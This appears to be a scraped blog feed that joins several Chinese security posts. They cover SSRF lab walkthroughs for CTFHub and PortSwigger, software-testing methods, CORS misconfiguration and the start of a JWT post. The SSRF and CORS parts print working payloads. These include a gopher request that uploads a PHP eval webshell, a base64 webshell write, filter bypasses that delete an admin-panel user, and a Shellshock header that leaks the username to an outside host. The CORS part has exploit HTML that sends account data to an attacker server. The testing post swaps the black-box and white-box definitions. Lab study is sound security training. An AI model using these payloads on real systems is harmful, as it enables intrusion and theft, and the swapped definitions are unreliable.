/?url=gopher%3A//127.0.0.1%3A80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520challenge-fdbaeb80bf490fcb.sandbox.ctfhub.com%253A10800%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A92.0)%2520Gecko%252F20100101%2520Firefox%252F92.0%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Fwebp%252C*%252F*%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D---------------------------3899987496969232395467070377%250D%250AContent-Length%253A%2520388%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-fdbaeb80bf490fcb.sandbox.ctfhub.com%253A10800%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-fdbaeb80bf490fcb.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250ACookie%253A%2520UM_distinctid%253D17bedb2040d988-0aed78614d6fec8-4c3e2778-144000-17bedb2040ff22%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A-----------------------------3899987496969232395467070377%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.php%2522%250D%250AContent-Type%253A%2520application%252Foctet-stream%250D%250A%250D%250AGIF89a%253C%253Fphp%250D%250A%2540eval(%2524_POST%255B\u0026#39;pass\u0026#39;%255D)%253B%250D%250A%253F%253E%250D%250A-----------------------------3899987496969232395467070377%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%25E6%259F%25A5%25E8%25AF%25A2%250D%250A-----------------------------3899987496969232395467070377-- HTTP/1.1 Host: challenge-5b46f441c84cf0b2.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Upgrade-Insecure-Requests: 1 Priority: u=0, i CTFHub\u0026mdash;FastCGI协议 首先要了解Fastcgi协议是什么，这里可以参考下文章\nhttps://segmentfault.com/a/1190000013112052\nhttps://blog.csdn.net/mysteryflower/article/details/94386461\n**CGI**协议的诞生是为了解决**HTTP**协议与编程语言之间的连接问题，从而减低动态页面的开发难度。这个协议避免所有的编程语言开发动态页面时还需要开发一套**HTTP**的解析库。\n**Fastcgi**程序将**CGI**程序的规范都进行了保留，并将其升级，主要是将输入和输出的方式从标准流迁移到了**socket**传输，同时，**fastcgi**协议也支持将**cgi**程序进行守护进程化，这样可以提高请求的处理速度，同时提高了稳定性。\n解题思路使用Gopherus进行文件上传getshell后查看\n1 2 3 python2 gopherus.py --exploit fastcgi echo PD9waHAgQGV2YWwoJFBPU1RfWydjbWQnXSk7Pz4= | base64 -d \u0026gt; /var/www/html/shell.php 读取文件，成功上传\nBurpSuite官方SSRF靶场通关思路 https://portswigger.net/web-security/all-labs 靶场地址\nhttps://portswigger.net/web-security/ssrf WP地址\nhttps://mp.weixin.qq.com/s/ZUFS8ISQv8qm0iCEB0sh6Q\n针对本地服务器的基本 SSRF SSRF存在位置：点击商品\u0026mdash;查看库存\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a96007e04d5516c803044a8008d00b4.web-security-academy.net Cookie: session=drqHd3J1bQVeABCIsr8xlErWiXY0x73M User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a96007e04d5516c803044a8008d00b4.web-security-academy.net/product?productId=14 Content-Type: application/x-www-form-urlencoded Content-Length: 60 Origin: https://0a96007e04d5516c803044a8008d00b4.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http://479j8u31i27ddn59ua2qf3b6kxqoeg25.oastify.com 网站要求删除**carlos用户，此时将url地址替换为**http://localhost/admin即可访问\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a96007e04d5516c803044a8008d00b4.web-security-academy.net Cookie: session=drqHd3J1bQVeABCIsr8xlErWiXY0x73M User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a96007e04d5516c803044a8008d00b4.web-security-academy.net/product?productId=14 Content-Type: application/x-www-form-urlencoded Content-Length: 31 Origin: https://0a96007e04d5516c803044a8008d00b4.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http://localhost/admin 直接点击删除用户会显示未授权访问，此时还是利用SSRF进行删除\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a96007e04d5516c803044a8008d00b4.web-security-academy.net Cookie: session=w2V91qXGsTAuF7nuW4iq0X7Egrs13gt3; session=drqHd3J1bQVeABCIsr8xlErWiXY0x73M User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a96007e04d5516c803044a8008d00b4.web-security-academy.net/product?productId=14 Content-Type: application/x-www-form-urlencoded Content-Length: 60 Origin: https://0a96007e04d5516c803044a8008d00b4.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http%3A%2F%2Flocalhost/admin/delete?username=carlos 针对内网其它服务器的SSRF 漏洞存在位置和6.1一样，也是存在点击商品\u0026mdash;查看库存\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a9a00ff04ae70da8260a14a00920027.web-security-academy.net Cookie: session=0RAnL6L1oPU3KBaGc15zbk7fpDtPRvT4 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a9a00ff04ae70da8260a14a00920027.web-security-academy.net/product?productId=2 Content-Type: application/x-www-form-urlencoded Content-Length: 96 Origin: https://0a9a00ff04ae70da8260a14a00920027.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1 题目描述内网IP：192.168.0.某台主机开放8080端口，需要使用该台主机删除用户*carlos**\n对目标主机IP地址进行爆破，发现内网192.168.0.110开放8080端口\n访问/admin目录成功进入管理员后台\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a9a00ff04ae70da8260a14a00920027.web-security-academy.net Cookie: session=0RAnL6L1oPU3KBaGc15zbk7fpDtPRvT4 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a9a00ff04ae70da8260a14a00920027.web-security-academy.net/product?productId=2 Content-Type: application/x-www-form-urlencoded Content-Length: 69 Origin: https://0a9a00ff04ae70da8260a14a00920027.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http%3A%2F%2F192.168.0.110:8080/admin/delete?username=carlos 成功删除carlos用户\n****带外检测的盲 SSRF 题目描述：要解决实验问题，请使用此功能向公共 Burp Collaborator 服务器发出 HTTP 请求。\n存在漏洞点在http请求中的referer字段，将referer字段url填写为BP的Collaborator模块即可解决问题\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 GET /product?productId=14 HTTP/2 Host: 0a60008b0446597680c95d4900e500ae.web-security-academy.net Cookie: session=8ukvsS5poaa36dDRTFMKqjGnJdEaQGpU User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: http://w415tlzzvtbm4yb6vny5qnh1psvjja7z.oastify.com Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers 具有基于黑名单的输入过滤器的 SSRF 题目描述和6.1\u0026amp;6.2一样，需要删除carlos用户\n漏洞点也是存在****点击商品\u0026mdash;查看库存\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a90006d03eb0af084a0223400ef0026.web-security-academy.net Cookie: session=P6vpudOBS7THYsWjfEXNgrzNq5cLydrf User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a90006d03eb0af084a0223400ef0026.web-security-academy.net/product?productId=1 Content-Type: application/x-www-form-urlencoded Content-Length: 37 Origin: https://0a90006d03eb0af084a0223400ef0026.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http%3A%2F%2F127.0.0.1/admin 但是过滤了，不让直接访问内网IP，Bypass\n1 2 环回地址绕过成功 进制绕过失败 但是添加目录又不行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0ab4001b0453b37d8007358b00d10042.web-security-academy.net Cookie: session=9wniPsfLjEOpp8Q2paREt6txQpEUVq4l User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0ab4001b0453b37d8007358b00d10042.web-security-academy.net/product?productId=2 Content-Type: application/x-www-form-urlencoded Content-Length: 33 Origin: https://0ab4001b0453b37d8007358b00d10042.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http%3A%2F%2F127.1/admin 对目录进行编码绕过，将\u0026quot;a\u0026quot;进行双URL编码为%2561\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0ab4001b0453b37d8007358b00d10042.web-security-academy.net Cookie: session=9wniPsfLjEOpp8Q2paREt6txQpEUVq4l User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0ab4001b0453b37d8007358b00d10042.web-security-academy.net/product?productId=2 Content-Type: application/x-www-form-urlencoded Content-Length: 31 Origin: https://0ab4001b0453b37d8007358b00d10042.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http://127.1/%2561dmin 通过开放重定向漏洞绕过过滤器的 SSRF 要解决实验问题，请更改库存检查 URL 以访问 Admin 界面， **\u0026lt;font style=\u0026quot;color:rgb(92, 92, 91);\u0026quot;\u0026gt;http://192.168.0.12:8080/admin\u0026lt;/font\u0026gt;** 并删除用户 **\u0026lt;font style=\u0026quot;color:rgb(92, 92, 91);\u0026quot;\u0026gt;carlos\u0026lt;/font\u0026gt;**。\n漏洞功能点：查看详细商品\u0026mdash;Next Product\n单击\u0026quot;next product\u0026quot;并观察到path参数被放置到重定向响应的Location头中，从而导致打开重定向\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 GET /product/nextProduct?currentProductId=2\u0026amp;path=/product?productId=3 HTTP/2 Host: 0a0f0008049d3117812cc0eb009f0017.web-security-academy.net Cookie: session=RvsFc32IvjozAi9Jpn0NpcGGO4j2jiwi; session=8c8YpHoJxmnNr0eT0cYNc7C6ztfCLxn7 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a0f0008049d3117812cc0eb009f0017.web-security-academy.net/product?productId=2 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers 使用DnsLog进行验证，发现存在回显，****创建一个利用开放重定向漏洞的URL，重定向到管理界面，并将其输入股票检查器上的stockApi参数：\nGet提交参数并不会显示信息，因为重定向到内网了\n此时重新回到检查数量功能点，抓包发现请求路径为\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a0f0008049d3117812cc0eb009f0017.web-security-academy.net Cookie: session=RvsFc32IvjozAi9Jpn0NpcGGO4j2jiwi; session=8c8YpHoJxmnNr0eT0cYNc7C6ztfCLxn7 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a0f0008049d3117812cc0eb009f0017.web-security-academy.net/product?productId=3 Content-Type: application/x-www-form-urlencoded Content-Length: 65 Origin: https://0a0f0008049d3117812cc0eb009f0017.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=/product/stock/check?productId=3\u0026amp;storeId=1 此时将stockApi的路径替换为存在SSRF的路径\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /product/stock HTTP/2 Host: 0a0f0008049d3117812cc0eb009f0017.web-security-academy.net Cookie: session=RvsFc32IvjozAi9Jpn0NpcGGO4j2jiwi; session=8c8YpHoJxmnNr0eT0cYNc7C6ztfCLxn7 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a0f0008049d3117812cc0eb009f0017.web-security-academy.net/product?productId=3 Content-Type: application/x-www-form-urlencoded Content-Length: 65 Origin: https://0a0f0008049d3117812cc0eb009f0017.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin 成功访问到内网信息，成功删除用户 stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos 使用 Shellshock 漏洞的盲 SSRF 题目描述：****本网站使用分析软件，当产品页面加载时，该软件会获取Referer标题中指定的URL。\n要解决实验问题，请使用此功能对端口8080上的192.168.0.X范围内的内部服务器执行SSRF盲攻击。在盲目攻击中，对内部服务器使用Shellshock有效负载以泄漏操作系统用户的名称\n漏洞点还是存在Http头的Referer字段,发送的bp进行主动扫描，发现UA字段存在外带\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 GET /product?productId=1 HTTP/2 Host: 0a9100de047ed21f812c483700c10016.web-security-academy.net Cookie: session=6nguy31YigoG8xuNqE55PbrvBqNOMBdQ User-Agent: () { :; }; /usr/bin/nslookup $(whoami).6ahbphz9r7tozk7rl6y75ygx2o8fw9ky.oastify.com Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://192.168.0.1:8080 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers 在UA头添加以下字段：() { :; }; /usr/bin/nslookup $(whoami).3qu85ef6749lfhno13e4lvwuilocc70w.oastify.com 在存在SSRF的Referer字段添加：https://192.168.0.1:8080，并使用bp模块遍历IP 此时Dnslog成功接收到请求，成功将系统用户名外带出来\n具有基于白名单的输入过滤器的 SSRF 实验要求：要解决实验问题：更改库存检查URL以访问管理界面http：//localhost/admin，并删除用户carlos\n漏洞点：检查库存\n直接修改为自己的Dnslog地址，提示URL只能为stock.weliketoshop.net\n将URL改为：http://username@stock.weliketoshop.net/，并观察其是否被接受，结果表明URL解析器支持嵌入式凭据\n使用#看是否能够隔断，发现不行，将#号进行两次url编码，成功绕过%2523\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a9700dc04e82ba08234071c003f00c4.web-security-academy.net Cookie: session=TSWdg1iN25RFgtSZQ9eqsoXh9qwCZu1s User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a9700dc04e82ba08234071c003f00c4.web-security-academy.net/product?productId=1 Content-Type: application/x-www-form-urlencoded Content-Length: 85 Origin: https://0a9700dc04e82ba08234071c003f00c4.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos 成功绕过\nSRC中SSRF漏洞挖掘 利用SSRF漏洞读取云服务元数据\n浅谈云上攻防\u0026ndash;SSRF漏洞带来的新威胁\nSRC实战|文件导出功能的SSRF\nSRC实战之云服务器全回显SSRF（新思路）\n","date":"2025-06-12T22:59:16+08:00","image":"https://lserein.github.io/p/ssrf/ssrf_hu_9bc9f653dbaec1fd.jpg","permalink":"https://lserein.github.io/p/ssrf/","title":"SSRF"},{"content":"1.白盒测试 定义：黑盒测试是一种不关注程序内部结构或实现细节，只关注软件的输入和输出的测试方法。测试人员把软件看作一个“黑盒子”，只根据需求规格说明书来设计测试用例。\n常见白盒测试方法：\n**语句覆盖：**被测程序中每个语句至少执行一次 **判定覆盖：**不仅每个语句必须至少执行一次，而且每个判定的每种可能的结果都应该至少执行一次 条件覆盖: 每个判定中的每个条件至少执行1次 判定条件覆盖 路径覆盖 组合覆盖 1 2 3 4 5 6 //以这个例子完成白盒测试 if A and B then Action1 if C or D then Action2 1.1.语句覆盖 选择足够多的测试数据，使被测程序中每个语句至少执行一次。\n在上面例子中，语句有两条，Action1和Action2\n1 2 3 4 A and B -\u0026gt; True ===\u0026gt; A=True \u0026amp;\u0026amp; B=True C or D -\u0026gt; True ===\u0026gt; C=True or D=True test1: A=true,B=true,C=true,d=true //语句覆盖 1.2.判定覆盖\u0026mdash;也叫分支覆盖 每个判断真假至少执行1次\n1 2 3 4 5 6 7 8 9 10 上面例子中： 判定 A and B C or D 条件：A B C D 判定覆盖测试用例： A and B ===T ===\u0026gt; A=T，B=T 1 A and B ===F ===\u0026gt; A=T，B=F 2 C or D ===T ===\u0026gt; C=T, D=T 3 C or D ===F ===\u0026gt; C=F, D=F 4 test1 A=T,B=T,C=T,D=F 1，3 test2 A=T，B=F，C=F，D=F 2，4 1.3.条件覆盖 每个判定中的每个条件至少执行1次\n1 2 3 4 5 6 条件覆盖，每个条件至少取一次真假 A True False B True False C True False D True False 5 6 test1 A=T，B=T，C=T，D=T test2 A=F，B=F，C=F，D=F 1.4.判定条件覆盖 就是判定覆盖和条件覆盖组合起来，既要让每个判定取一次真假，也要让每个条件取一次真假\n1 2 3 4 5 6 7 8 9 10 11 12 判定覆盖测试用例： A and B ===T ===\u0026gt; A=T，B=T 1 A and B ===F ===\u0026gt; A=T，B=F 2 C or D ===T ===\u0026gt; C=T, D=T 3 C or D ===F ===\u0026gt; C=F, D=F 4 A True False B True False C True False D True False 5 6 test1 A=T,B=T,C=T,D=T 1,3,5 test2 A=F,B=F,C=F,D=F 2,4,6 1.5.路径覆盖 把程序每条路径走一遍\n1 2 3 4 5 6 7 8 9 (x\u0026gt;3) and (z\u0026lt;10) 真 假 action1 () （x==4） or (y\u0026gt;5) （x==4） or (y\u0026gt;5) 真 假 真 假 action2 action2 action3 action3 action3 action3 test1 x=4,z=9,y=6 路径1 test2 x=5,z=9,y=1 路径2 test3 x=2,z=9,y=6 路径3 test4 x=2,z=9,y=1 路径4 1.6.组合覆盖\u0026mdash;也叫条件组合覆盖 把每个判定中的条件组合\n1 2 3 4 5 6 7 8 9 10 11 12 Verdict: A and B C OR D Combined coverage: A B C D T F T F test1 T T T T test2 F T F T test3 F F F F test4 2.黑盒测试 定义：白盒测试是一种关注程序内部结构、实现逻辑和代码路径的测试方法。测试人员需要了解程序的内部代码，根据代码逻辑设计测试用例，以验证程序内部的正确性。\n常见黑盒测试方法：\n等价类划分 边界值分析 因果图 判定表 场景测试 2.1.等价类划分 步骤：找出限制条件\n划分有效等价类和无效等价类\n输入测试数据覆盖等价类\n2.2.边界值分析 2.3.因果图 2.4.判定表 ","date":"2025-06-12T12:15:50+08:00","image":"https://lserein.github.io/p/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95%E4%B8%8E%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95/test_hu_b4c722d0cdcc3bb.jpg","permalink":"https://lserein.github.io/p/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95%E4%B8%8E%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95/","title":"黑盒测试与白盒测试"},{"content":"什么是CORS CORS（Cross-Origin Resource Sharing，跨域资源共享）是一种现代Web技术，用于解决浏览器的同源策略限制，允许不同源的Web应用安全地进行跨域HTTP请求。该机制通过允许服务器标示除了它自己以外的其他源，使得其它浏览器允许这些域加载自己的资源。\n1 2 3 4 5 6 7 8 9 10 如何标识呢：通过Http响应头标识 如：Origin：* //表示所有请求均可 Origin：https://www.bilibili.com //只允许哔哩哔哩的请求 服务端响应头部 Access-Control-Allow-Origin：指定允许访问资源的源（如*表示允许所有源，或指定具体域名） Access-Control-Allow-Methods：允许的HTTP方法（如GET, POST, PUT） Access-Control-Allow-Headers：允许的自定义头部（如X-Custom-Header） Access-Control-Allow-Credentials：是否允许发送Cookie（值为true） Access-Control-Max-Age：预检请求结果的缓存时间（秒） 什么是浏览器同源策略 同源策略是浏览器的一种安全机制，它阻止一个源（origin）的文档或脚本访问另一个源的资源。同源的定义是：\n1 2 3 协议相同（http/https） 域名相同 端口相同 CORS的工作机制 简单请求 1 2 直接F12在浏览器控制台上 fetch(\u0026#39;https://www.baidu.com\u0026#39;) 简单请求：只使用了Get/POST/Head的请求，并且请求头只使用：Accept/Content-Type,浏览器会直接发起请求,然后检查服务端的http头，对于正常内容则加载\n非简单请求 非简单请求：浏览器会发起一个Option方法来预检服务器是否允许当前域访问请求资源\n为什么使用CORS 保护服务器，有助于减轻服务器的负载与风险 保护隐私，CORS限制了敏感数据的访问 安全考虑，防止盗取用户数据或进行CSRF攻击 如何解决CORS问题 1-同源策略（增加反向代理）；\n2-正确设置 CORS 标头，正确响应 Options 预检请求；\n3-使用Jsonp\nCORS漏洞案例 如何发现这种漏洞，当返回数据包中存在敏感信息时，如APIKey，账号密码，身份证等信息时就可以进行CORS测试\n如果返回头是以下情况，那么是最好利用的，高风险\n1 2 3 4 5 6 Access-Control-Allow-Origin：https://www.test.com Access-Control-Allow-Credentials:true //也可以认为是高危，只是漏洞利用起来麻烦一点 Access-Control-Allow-Origin：null //注意是小写 Access-Control-Allow-Credentials:true 低风险常见于配置错误，因为CORS安全机制阻止了这种情况下的漏洞利用\n1 2 Access-Control-Allow-Origin：* Access-Control-Allow-Credentials:true 不存在漏洞情况\n1 2 Access-Control-Allow-Origin：Null //小写才存在CORS漏洞，大写表示不存在 Access-Control-Allow-Credentials:true 具有基本源反射的 CORS 漏洞 1 2 3 在请求包中添加响应头 Origin: https://www.baidu.com 如果返回包正常返回 1 2 3 4 5 6 7 8 9 10 11 12 13 14 GET /accountDetails HTTP/2 Host: 0a84003e03504173801153c700a900ba.web-security-academy.net Origin: https://www.test.com Cookie: session=kL0xYb4ZOonl9QChIoXGQaZZQNpMU2e8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a84003e03504173801153c700a900ba.web-security-academy.net/my-account?id=wiener Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=4 Te: trailers 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;!-- cors.html --\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;cors exp\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var req = new XMLHttpRequest(); req.onload = reqListener; //替换为存在漏洞的地址即可 req.open(\u0026#34;GET\u0026#34;, \u0026#34;https://0a84003e03504173801153c700a900ba.web-security-academy.net/accountDetails\u0026#34;,\u0026#39;true\u0026#39;); req.withCredentials = true; req.send(\u0026#39;{}\u0026#39;); function reqListener(){ alert(this.responseText); //自己服务器记录日志的地址 location=\u0026#39;http://http://47.76.47.203:8232/?key=\u0026#39;+this.responseText; }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","date":"2025-06-11T10:53:33+08:00","image":"https://lserein.github.io/p/cors/cors_hu_23fa8f5a89180dc9.jpg","permalink":"https://lserein.github.io/p/cors/","title":"CORS"},{"content":"什么是JWT https://xz.aliyun.com/t/6776\nJWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。\njwt由三个部分组成：header-payload-signature\nheader头 header部分最常用的两个字段是alg和typ，alg指定了token加密使用的算法（最常用的为HMAC和RSA算法），typ声明类型为JWT\n1 2 3 4 { \u0026#34;alg\u0026#34; : \u0026#34;HS256\u0026#34;, \u0026#34;typ\u0026#34; : \u0026#34;jwt\u0026#34; } payload部分 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 { \u0026#34;user_role\u0026#34; : \u0026#34;finn\u0026#34;, //当前登录用户 \u0026#34;iss\u0026#34;: \u0026#34;admin\u0026#34;, //该JWT的签发者 \u0026#34;iat\u0026#34;: 1573440582, //签发时间 \u0026#34;exp\u0026#34;: 1573940267, //过期时间 \u0026#34;nbf\u0026#34;: 1573440582, //该时间之前不接收处理该Token \u0026#34;domain\u0026#34;: \u0026#34;example.com\u0026#34;, //面向的用户 \u0026#34;jti\u0026#34;: \u0026#34;dff4214121e83057655e10bd9751d657\u0026#34; //Token唯一标识 } { \u0026#34;name\u0026#34;: null, \u0026#34;id\u0026#34;: 20, 